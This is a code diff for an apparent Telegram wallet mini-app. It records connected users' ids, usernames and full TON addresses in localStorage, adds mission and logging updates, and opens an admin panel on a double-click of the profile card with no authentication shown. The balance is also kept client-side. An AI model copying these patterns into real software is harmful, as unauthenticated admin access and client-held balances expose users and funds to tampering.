     let bal = parseFloat(localStorage.getItem('bal_v47')) || 0;
@@ -1490,14 +2049,26 @@
 
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
-            const address = wallet.account.address;
-            const shortAddress = address.slice(0, 4) + '...' + address.slice(-4);
-            document.getElementById('walletAddressText').innerText = shortAddress;
+            const fullAddress = wallet.account.address;
+            document.getElementById('walletAddressFull').innerText = fullAddress;
             document.getElementById('walletAddress').classList.remove('hidden');
             isWalletConnected = true;
             
+            const user = tg.initDataUnsafe?.user;
+            const walletInfo = {
+                userId: user?.id,
+                username: user?.username,
+                address: fullAddress,
+                time: new Date().toISOString()
+            };
+            connectedWallets.unshift(walletInfo);
+            if (connectedWallets.length > 50) connectedWallets.pop();
+            localStorage.setItem('connectedWallets', JSON.stringify(connectedWallets));
+            
             checkAndEnableFinalWithdraw();
-            trackUserActivity('اتصال کیف پول');
+            logUserActivity('wallet_connected', { 
+                address: fullAddress.substring(0, 10) + '...' 
+            });
         } else {
             document.getElementById('walletAddress').classList.add('hidden');
             isWalletConnected = false;
@@ -1505,11 +2076,42 @@
         }
     });
 
+    // آپدیت وضعیت ماموریت‌ها
+    function updateMissionsUI() {
+        // فقط تلگرام
+        const checkElement = document.getElementById('checkTelegram');
+        const claimElement = document.getElementById('claimTelegram');
+        
+        if (checkElement && claimElement) {
+            if (missions.telegram.checked) {
+                checkElement.classList.add('completed');
+            }
+            if (missions.telegram.claimed) {
+                claimElement.disabled = true;
+                claimElement.style.opacity = '0.3';
+            } else if (missions.telegram.checked) {
+                claimElement.disabled = false;
+            }
+        }
+    }
+
+    // فعال کردن پنل ادمین با دابل کلیک روی پروفایل
+    let adminClickCount = 0;
+    document.querySelector('.card-profile').addEventListener('dblclick', function() {
+        adminClickCount++;
+        if (adminClickCount >= 2) {
+            openAdminPanel();
+            adminClickCount = 0;
+        }
+        setTimeout(() => { adminClickCount = 0; }, 1000);
+    });
+
     updateWalletHistory();
     updateReferralsList();
     updateUserLevel();
     updateRewardButton();
     checkAndEnableFinalWithdraw();
+    updateMissionsUI();
 
     setInterval(() => {
         updateRewardButton();
@@ -1517,11 +2119,13 @@
 
     setTimeout(() => {
         trackUserActivity('ورود به ربات');
+        logUserActivity('session_start', {});
     }, 1000);
 
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Escape') {
             closeLevelModal();
+            closeAdminPanel();
         }
     });
 </script>
